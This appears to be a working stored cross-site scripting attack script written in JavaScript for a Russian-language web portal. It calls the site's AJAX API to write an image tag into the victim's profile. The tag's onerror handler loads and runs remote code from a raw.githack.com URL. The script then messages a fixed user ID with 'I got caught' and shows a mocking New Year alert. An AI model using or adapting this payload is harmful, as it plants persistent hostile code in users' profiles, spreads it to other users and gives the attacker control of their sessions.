runAsyncAjaxRequest3({
    process: 'SAVE_ABOUT',
    flow_id: '2437',
    pageNew: 7,
    g_param: {
      names: ["x01", "f01"],
      values: ["rus", '\<IMG id = \"test\" SRC=/ onerror=\"var script = document.createElement(\'script\');script.src = \'https://raw.githack.com/voronoff2803/informatics/master/test.js\';script.type = \'text/javascript\';script.charset = \'UTF-8\';script.async = false;document.head.appendChild(script);document.getElementById(\'test\').remove()"\>\</img\>']
    }
  });

runAsyncAjaxRequest2("2003",
        "3",
        "ZERO_PAGE",
        "APPLICATION_PROCESS=MSG_SEND", ["MSG_REFWD", "MSG_TO_ID", "MSG_SUBJ", "MSG_TO_COPY", "MSG_CORE", "MSG_FILE", "MSG_TO_COPY_XTRA_LIST"], ["", "241876", "Я попался", "", "", "", ""],
        ["x01"],
        ["2143"],
        function() {});

alert( "             🎄С новым годом !!!🎄 \n\n Только не заходи в свой профиль" );
